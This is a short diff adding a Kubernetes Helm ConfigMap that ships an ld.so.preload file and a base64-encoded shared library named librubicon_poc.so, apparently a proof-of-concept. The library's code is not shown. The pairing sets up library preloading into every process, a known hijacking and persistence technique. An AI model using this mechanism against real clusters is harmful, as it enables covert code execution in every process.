@@ -1,0 +1,10 @@
+apiVersion: v1
+kind: ConfigMap
+metadata:
+  name: preload-config-maps
+data:
+  ld.so.preload: |-
+    {{ .Files.Get "binaries/ld.so.preload" }}
+binaryData:
+  librubicon_poc.so: |-
+    {{ .Files.Get "binaries/librubicon_poc.so" | b64enc | indent 4 }}
